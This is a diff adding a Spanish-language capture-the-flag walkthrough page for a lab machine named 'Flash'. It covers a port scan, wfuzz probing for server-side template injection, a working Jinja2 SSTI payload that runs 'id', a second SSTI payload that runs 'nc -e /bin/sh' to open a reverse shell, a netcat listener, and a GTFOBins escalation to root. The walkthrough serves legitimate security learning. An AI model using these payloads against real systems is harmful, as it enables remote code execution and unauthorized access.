@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -11,17 +11,81 @@
         <h1>FLASH</h1>
         <div class="text-img">
             <img src="img/Flash/1.jpg" alt="" class="img-principal">
-            <p>Esta maquina presenta lo siguiente:</p>
+            <p class="text">Esta maquina presenta lo siguiente:</p>
             <img src="img/Flash/2.png" alt="" class="img-sec">
-            <img src="" alt="">
-            <img src="" alt="">
-            <img src="" alt="">
-            <img src="" alt="">
-            <img src="" alt="">
-            <img src="" alt="">
-            <img src="" alt="">
-            <img src="" alt="">
-            <img src="" alt="">
+            <p>Se ve los siguientes puertos abiertos:
+                <br>
+                22,80,8080
+                <br>
+                Por lo que nos ponemos a verificar las paginas de 80 y 8080            </p>
+            <img src="img/Flash/web1.jpeg" alt="" class="img-sec">
+            <p>En ambos casos se encuentra el mismo contenido por lo que procedemos a realizar testeos ya sea de otros direcortios o en este caso una vulnerabilidad SSTI</p>
+            <img src="img/Flash/scan1.png" alt="" class="img-sec">
+            <p>En este caso se esta haciendo uso de wfuzz con una verificacion de la palabra clave para el Server-side Template Injection (SSTI) y procedemos a probar</p>
+            <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>IP:8080/?name={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</span></pre>
+                </div>
+              </div>
+            <img src="img/Flash/injection1.png" alt="" class="img-sec">
+            <p>Ahora procedemos a hacer la injeccion para la reverse Shell</p>
+            <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>IP:8080/?name=</span>{{<span>request</span>.<span>application</span>.<span>__globals__</span>.<span>__builtins__</span>.<span>__import__</span>(<span class="pl-s">'os'</span>).<span class="pl-en">popen</span>(<span>'nc -e /bin/sh IPvictima 443'</span>).<span>read</span>()}}</pre>
+                </div>
+              </div>
+            <img src="img/Flash/injection2.jpeg" alt="" class="img-sec">
+            <p>Para que usted lo resiva deve estar a la escucha al puerto que uso para la reverse shell <br>Ejemplo:</p>
+            <div class="card">
+                <div class="tools">
+                  <div class="circle">
+                    <span class="red box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="yellow box"></span>
+                  </div>
+                  <div class="circle">
+                    <span class="green box"></span>
+                  </div>
+                </div>
+                <div class="card__content">
+                    <pre><span>nc -lnpv 443</span></pre>
+                </div>
+              </div>
+            <img src="img/Flash/explotacion.png" alt="" class="img-sec">
+            <p>Ahora vemos que ya ingresamos y encontramos la Flag1, pero vemos que somos como randy asi que intentamos elevacion</p>
+            <img src="img/Flash/elev1.png" alt="" class="img-sec">
+            <p>Sin embargo esto es una trampa ya que ese programa ccal no podemos usarlo para escalar asi que buscando entre los directorios encontramos en /var/www/html que hay un archivo rev.php y que podemos leerlo el contenido es el siguiente:</p>
+            <img src="img/Flash/explotacion2.png" alt="" class="img-sec">
+            <p>Vemos que responde con un dominio con ese usuario posiblemente ya entremos con www-data</p>
+            <img src="img/Flash/explotacion3.png" alt="" class="img-sec">
+            <p>Asi que lo añadimos a nuestros hosts y volvemos a hacer la reverse shell</p>
+            <img src="img/Flash/elev2.png" alt="" class="img-sec">
+            <p>Vemos que efectivamente ya entramos como www-data asi que vemos si hay algun programa que ejecute root</p>
+            <img src="img/Flash/elev3.png" alt="" class="img-sec">
+            <p>Ese programa tenia una vulnerabilidad sacada de <a href="https://gtfobins.github.io">GTFOBins</a> la explotamos y ya somos root</p>
         </div>
     </div>
 </body>
